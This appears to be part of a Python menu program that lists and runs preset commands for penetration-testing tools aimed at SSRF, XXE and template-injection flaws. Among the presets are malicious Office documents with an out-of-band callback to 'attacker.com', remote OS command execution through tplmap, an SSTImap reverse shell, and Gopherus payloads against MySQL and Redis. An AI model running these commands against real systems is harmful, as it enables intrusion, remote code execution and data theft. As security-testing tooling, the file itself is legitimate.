                "command": "ssrfmap -u example.com --advanced",
                "description": "Run advanced tests"
            }
        },
        "Gopherus": {
            "1": {
                "name": "MySQL Exploit",
                "command": "gopherus --exploit mysql",
                "description": "Generate MySQL SSRF payload"
            },
            "2": {
                "name": "Redis Exploit",
                "command": "gopherus --exploit redis",
                "description": "Generate Redis SSRF payload"
            },
            "3": {
                "name": "Custom Payload",
                "command": "gopherus --exploit custom",
                "description": "Create custom SSRF payload"
            },
            "4": {
                "name": "SMTP Exploit",
                "command": "gopherus --exploit smtp",
                "description": "Generate SMTP SSRF payload"
            },
            "5": {
                "name": "Zabbix Exploit",
                "command": "gopherus --exploit zabbix",
                "description": "Generate Zabbix SSRF payload"
            }
        },
        "Ground-control": {
            "1": {
                "name": "Start Server",
                "command": "ground-control -p 8080",
                "description": "Start SSRF testing server"
            },
            "2": {
                "name": "Generate Payloads",
                "command": "ground-control -g -o payloads.txt",
                "description": "Generate SSRF payloads"
            },
            "3": {
                "name": "Custom Domain",
                "command": "ground-control -p 8080 -d ssrf.example.com",
                "description": "Use custom domain"
            },
            "4": {
                "name": "Log Requests",
                "command": "ground-control -p 8080 -l requests.log",
                "description": "Log incoming requests"
            },
            "5": {
                "name": "Webhook Mode",
                "command": "ground-control -p 8080 -w https://webhook.site/id",
                "description": "Forward requests to webhook"
            }
        },
        "SSRFire": {
            "1": {
                "name": "Basic Scan",
                "command": "ssrfire -u example.com",
                "description": "Basic SSRF detection"
            },
            "2": {
                "name": "Parameter Scan",
                "command": "ssrfire -u example.com -p",
                "description": "Test all parameters"
            },
            "3": {
                "name": "Callback Server",
                "command": "ssrfire -u example.com -c ssrf.example.com",
                "description": "Use custom callback server"
            },
            "4": {
                "name": "Output File",
                "command": "ssrfire -u example.com -o results.txt",
                "description": "Save results to file"
            },
            "5": {
                "name": "Verbose Mode",
                "command": "ssrfire -u example.com -v",
                "description": "Show detailed output"
            }
        },
        "Httprebind": {
            "1": {
                "name": "Start Server",
                "command": "httprebind -i 0.0.0.0 -p 8080",
                "description": "Start DNS rebinding server"
            },
            "2": {
                "name": "Custom Domain",
                "command": "httprebind -i 0.0.0.0 -p 8080 -d rebind.example.com",
                "description": "Use custom domain"
            },
            "3": {
                "name": "Target IP",
                "command": "httprebind -i 0.0.0.0 -p 8080 -t 192.168.1.1",
                "description": "Set target IP address"
            },
            "4": {
                "name": "Target Port",
                "command": "httprebind -i 0.0.0.0 -p 8080 -tp 8000",
                "description": "Set target port"
            },
            "5": {
                "name": "Delay Setting",
                "command": "httprebind -i 0.0.0.0 -p 8080 -dl 5",
                "description": "Set rebind delay"
            }
        }
    },
    "XXE Injection": {
        "XXEinjector": {
            "1": {
                "name": "Basic Scan",
                "command": "xxeinjector -u example.com",
                "description": "Basic XXE vulnerability scan"
            },
            "2": {
                "name": "Custom DTD",
                "command": "xxeinjector -u example.com -dtd custom.dtd",
                "description": "Use custom DTD file"
            },
            "3": {
                "name": "Out-of-band",
                "command": "xxeinjector -u example.com --oob",
                "description": "Test out-of-band XXE"
            },
            "4": {
                "name": "Parameter Test",
                "command": "xxeinjector -u example.com -p xml,data",
                "description": "Test specific parameters"
            },
            "5": {
                "name": "Save Output",
                "command": "xxeinjector -u example.com -o results.txt",
                "description": "Export findings to file"
            }
        },
        "Oxml_xxe": {
            "1": {
                "name": "Basic Test",
                "command": "oxml_xxe scan example.com",
                "description": "Basic Office XML XXE test"
            },
            "2": {
                "name": "File Upload",
                "command": "oxml_xxe upload -f document.docx",
                "description": "Test file upload"
            },
            "3": {
                "name": "Generate Payload",
                "command": "oxml_xxe generate -o payload.docx",
                "description": "Create malicious document"
            },
            "4": {
                "name": "Custom Template",
                "command": "oxml_xxe generate -t template.docx",
                "description": "Use custom template"
            },
            "5": {
                "name": "Export Results",
                "command": "oxml_xxe scan -o results.txt example.com",
                "description": "Save scan results"
            }
        },
        "Docem": {
            "1": {
                "name": "Basic Scan",
                "command": "docem -u example.com",
                "description": "Test document XXE"
            },
            "2": {
                "name": "Generate Payload",
                "command": "docem -g -o evil.docx",
                "description": "Create malicious document"
            },
            "3": {
                "name": "Format Selection",
                "command": "docem -g -t xlsx -o evil.xlsx",
                "description": "Create specific format"
            },
            "4": {
                "name": "Custom Callback",
                "command": "docem -g -c 'http://attacker.com' -o evil.docx",
                "description": "Use custom callback URL"
            },
            "5": {
                "name": "Advanced Options",
                "command": "docem -g -a -o evil.docx",
                "description": "Use advanced payload techniques"
            }
        },
        "Dtd-finder": {
            "1": {
                "name": "Basic Scan",
                "command": "dtd-finder -u example.com",
                "description": "Find DTDs in target"
            },
            "2": {
                "name": "Recursive Scan",
                "command": "dtd-finder -u example.com -r",
                "description": "Recursively scan"
            },
            "3": {
                "name": "Custom Depth",
                "command": "dtd-finder -u example.com -d 3",
                "description": "Set scan depth"
            },
            "4": {
                "name": "Output File",
                "command": "dtd-finder -u example.com -o results.txt",
                "description": "Save results to file"
            },
            "5": {
                "name": "Verbose Mode",
                "command": "dtd-finder -u example.com -v",
                "description": "Show detailed output"
            }
        },
        "Xxeserv": {
            "1": {
                "name": "Start Server",
                "command": "xxeserv -p 8080",
                "description": "Start XXE server"
            },
            "2": {
                "name": "Payload Generation",
                "command": "xxeserv -g -o payload.xml",
                "description": "Generate XXE payload"
            },
            "3": {
                "name": "Custom DTD",
                "command": "xxeserv -d custom.dtd -p 8080",
                "description": "Serve custom DTD"
            },
            "4": {
                "name": "Capture Mode",
                "command": "xxeserv -p 8080 -c",
                "description": "Capture all requests"
            },
            "5": {
                "name": "Log File",
                "command": "xxeserv -p 8080 -l xxe.log",
                "description": "Log activities to file"
            }
        }
    },
    "SSTI Injection": {
        "Tplmap": {
            "1": {
                "name": "Basic Scan",
                "command": "tplmap -u example.com",
                "description": "Basic template injection scan"
            },
            "2": {
                "name": "Custom Engine",
                "command": "tplmap -u example.com -e jinja2",
                "description": "Test specific template engine"
            },
            "3": {
                "name": "Command Execution",
                "command": "tplmap -u example.com --os-cmd 'id'",
                "description": "Try command execution"
            },
            "4": {
                "name": "Custom Headers",
                "command": "tplmap -u example.com -H 'Cookie: session=value'",
                "description": "Include custom headers"
            },
            "5": {
                "name": "Save Output",
                "command": "tplmap -u example.com -o results.txt",
                "description": "Export findings to file"
            }
        },
        "SSTImap": {
            "1": {
                "name": "Quick Test",
                "command": "sstimap -u example.com",
                "description": "Basic SSTI vulnerability test"
            },
            "2": {
                "name": "Detect Engine",
                "command": "sstimap -u example.com --detect",
                "description": "Detect template engine"
            },
            "3": {
                "name": "Custom Payload",
                "command": "sstimap -u example.com -p payload.txt",
                "description": "Use custom payload"
            },
            "4": {
                "name": "Reverse Shell",
                "command": "sstimap -u example.com --reverse-shell",
                "description": "Attempt reverse shell"
            },
            "5": {
                "name": "Level Test",
                "command": "sstimap -u example.com --level 5",
                "description": "Set test intensity level"
            }
        }
    }
}

def handle_tool_commands(tool_name):
    if tool_name not in TOOL_COMMANDS:
        console.print(f"[red]No tools configured for {tool_name}[/red]")
        return

    while True:
        console.print(f"\n[bold cyan]Available {tool_name} Tools:[/bold cyan]")
        tools = list(TOOL_COMMANDS[tool_name].keys())
        for i, tool in enumerate(tools, 1):
            console.print(f"{i}. {tool}")

        tool_choice = Prompt.ask(
            "\n[yellow]Select a tool number or type 'back'[/yellow]",
            choices=[str(i) for i in range(1, len(tools) + 1)] + ["back"],
            default="back"
        )

        if tool_choice == "back":
            break

        selected_tool = tools[int(tool_choice) - 1]
        display_tool_commands(tool_name, selected_tool)

def display_tool_commands(tool_type, tool_name):
    commands = TOOL_COMMANDS[tool_type][tool_name]

    while True:
        console.print(f"\n[bold cyan]━━━ {tool_name} Commands ━━━[/bold cyan]")
        for cmd_id, cmd_info in commands.items():
            console.print(f"\n[yellow]{cmd_id}[/yellow]: {cmd_info['name']}")
            console.print(f"[dim]Description: {cmd_info['description']}[/dim]")
            console.print(f"[blue]Command: {cmd_info['command']}[/blue]")
            console.print("─" * 50)

        cmd_choice = Prompt.ask(
            "\n[yellow]Select a command number or type 'back'[/yellow]",
            choices=list(commands.keys()) + ["back"],
            default="back"
        )

        if cmd_choice == "back":
            break

        command = commands[cmd_choice]["command"]
        execute_command(command)